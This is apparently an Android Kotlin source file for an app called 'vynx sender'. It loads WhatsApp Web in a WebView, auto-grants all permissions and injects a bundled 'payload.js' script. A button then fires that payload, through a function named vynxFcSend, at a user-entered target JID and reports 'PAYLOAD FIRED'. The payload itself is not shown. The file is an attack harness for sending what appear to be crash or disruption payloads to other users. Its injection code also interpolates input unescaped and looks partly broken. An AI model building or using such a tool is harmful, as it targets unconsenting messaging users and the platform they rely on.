package com.vynx.sender

import android.annotation.SuppressLint
import android.os.Bundle
import android.view.View
import android.webkit.*
import android.widget.*
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private lateinit var targetInput: EditText
    private lateinit var sendBtn: Button
    private lateinit var statusText: TextView
    private var jsPayload: String = ""

    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        webView = findViewById(R.id.webview)
        targetInput = findViewById(R.id.target_input)
        sendBtn = findViewById(R.id.send_btn)
        statusText = findViewById(R.id.status_text)

        // Load payload JS from assets
        jsPayload = assets.open("payload.js").bufferedReader().use { it.readText() }

        setupWebView()
        setupSendButton()
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            allowFileAccess = true
            allowContentAccess = true
            databaseEnabled = true
            setGeolocationEnabled(true)
            userAgentString = "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
            mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
            javaScriptCanOpenWindowsAutomatically = true
            mediaPlaybackRequiresUserGesture = false
            useWideViewPort = true
            loadWithOverviewMode = true
        }

        webView.webChromeClient = object : WebChromeClient() {
            override fun onPermissionRequest(request: PermissionRequest?) {
                request?.grant(request.resources)
            }
        }

        webView.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                statusText.text = "WA Web loaded. Scan QR."
                // Inject payload script
                view?.evaluateJavascript(jsPayload, null)
            }

            override fun shouldOverrideUrlLoading(view: WebView?, request: WebResourceRequest?): Boolean {
                val url = request?.url.toString()
                if (url.startsWith("https://web.whatsapp.com") ||
                    url.startsWith("https://wa.me") ||
                    url.contains("whatsapp.com")) {
                    return false
                }
                return false
            }
        }

        // Clear any previous sessions
        CookieManager.getInstance().removeAllCookies(null)
        webView.clearCache(true)
        webView.clearHistory()

        webView.loadUrl("https://web.whatsapp.com")
    }

    private fun setupSendButton() {
        sendBtn.setOnClickListener {
            val target = targetInput.text.toString().trim()
            if (target.isEmpty()) {
                statusText.text = "Enter target JID first"
                return@setOnClickListener
            }

            statusText.text = "Injecting payload to $target..."

            val injectJS = """
                (function() {
                    if (typeof vynxFcSend === 'function') {
                        vynxFcSend('$target');
                        return 'sent';
                    } else {
                        // Re-inject payload and try again
                        var script = document.createElement('script');
                        script.textContent = `$jsPayload`;
                        document.head.appendChild(script);
                        setTimeout(function() {
                            if (typeof vynxFcSend === 'function') {
                                vynxFcSend('$target');
                            }
                        }, 500);
                        return 'reloading';
                    }
                })();
            """.trimIndent().replace("`", "\\`")

            webView.evaluateJavascript(injectJS) { result ->
                runOnUiThread {
                    when {
                        result.contains("sent") -> statusText.text = "PAYLOAD FIRED → $target"
                        result.contains("reloading") -> statusText.text = "Re-injected. Try again in 2s."
                        else -> statusText.text = "Response: $result"
                    }
                }
            }
        }
    }

    override fun onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack()
        } else {
            super.onBackPressed()
        }
    }
}
